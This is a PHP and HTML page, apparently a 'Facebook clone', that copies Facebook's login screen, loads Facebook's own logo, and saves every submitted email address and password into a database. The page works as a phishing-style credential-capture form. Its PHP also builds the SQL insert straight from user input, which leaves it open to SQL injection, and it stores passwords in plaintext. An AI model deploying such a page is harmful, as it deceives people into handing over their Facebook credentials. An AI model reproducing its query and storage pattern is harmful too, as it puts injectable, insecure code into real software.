
<?php

session_start();
include("db.php");

if($_SERVER['REQUEST_METHOD'] == "POST")
{
  $email = $_POST['email'];
  $pass = $_POST['pass'];

  if(!empty($email) && !empty($pass) && !is_numeric($email) )
  {
    $query = "insert into form( email,pass) values ('$email', '$pass')";

    mysqli_query($con, $query);

    echo "<script type = 'text/javascript'> alert('Successfully Register')</script>";
  }
  else{
    echo "<script type = 'text/javascript'> alert('Please Enter valid Information')</script>";

  }
}
?>


<!DOCTYPE html>
<html lang="en">
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta charset="utf-8" />
    <title>Log in to Facebook - Clone</title>
    <link rel="stylesheet" href="style.css" />
  </head>
  <body>
    <div class="main">
      <div class="ff">
        <div class="logo">
          <img
            src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"
            alt="facebook" />
        </div>
        <div class="container">
          <div class="login-title">Log in to Facebook</div>
          <div class="form">
            <form method="POST">
              <div class="input-text">
                <input
                  type="text"
                  placeholder="Email address or phone number"
                  name="email"
                  class="input" />
              </div>
              <div class="input-pass">
                <input
                  type="password"
                  placeholder="Password"
                  name="pass"
                  class="input" />
              </div>
              <div class="submit">
                <button type="submit" class="lbtn">Create Account</button>
              </div>
            </form>
            <div class="fp">
              <a href="#">Forgotten Account?</a>
            </div>
          </div>
          <div class="or">
            <div class="before"></div>
            <div class="o">or</div>
            <div class="after"></div>
          </div>

          <div class="signup"><a href="index.php">Log In</a></div>
        </div>
      </div>
    </div>
    <footer class="footer">
      <div class="firstfooter">
        <div class="lang">
          <ul class="first">
            <li><a href="#">English</a></li>
            <li><a href="#">தமிழ்</a></li>
            <li><a href="#">తెలుగు</a></li>
            <li><a href="#">ಕನ್ನಡ</a></li>
            <li><a href="#">हिन्दी</a></li>
            <li><a href="#">മലയാളം</a></li>
            <li><a href="#">සිංහල</a></li>
            <li><a href="#">ਪੰਜਾਬੀ</a></li>
            <li><a href="#">বাংলা</a></li>
            <li><a href="#">ગુજરાતી</a></li>
            <li><input type="button" value="+" class="button" /></li>
          </ul>
        </div>
        <div class="space"></div>
        <div class="content-footer">
          <ul class="second">
            <li><a href="#">Sign Up</a></li>
            <li><a href="#">Log In</a></li>
            <li><a href="#">Messenger</a></li>
            <li><a href="#">Facebook Lite</a></li>
            <li><a href="#">Watch</a></li>
            <li><a href="#">Places</a></li>
            <li><a href="#">Games</a></li>
            <li><a href="#">Market Place</a></li>
            <li><a href="#">Facebook Pay</a></li>
            <li><a href="#">Oculus</a></li>
            <li><a href="#">Portal</a></li>
            <li><a href="#">Instagram</a></li>
            <li><a href="#">Bulletin</a></li>
            <li><a href="#">Local</a></li>
            <li><a href="#">Fundraisers</a></li>
            <li><a href="#">Services</a></li>
            <li><a href="#">Voting Information Center</a></li>
            <li><a href="#">Groups</a></li>
            <li><a href="#">About</a></li>
            <li><a href="#">Create ad</a></li>
            <li><a href="#">Create Page</a></li>
            <li><a href="#">Developers</a></li>
            <li><a href="#">Careers</a></li>
            <li><a href="#">Privacy</a></li>
            <li><a href="#">Cookies</a></li>
            <li><a href="#">AdChoices</a></li>
            <li><a href="#">Terms</a></li>
            <li><a href="#">Help</a></li>
            <li><a href="#">Contact Uploading And Non-Users</a></li>
          </ul>
        </div>
      </div>
    </footer>
  </body>
</html>
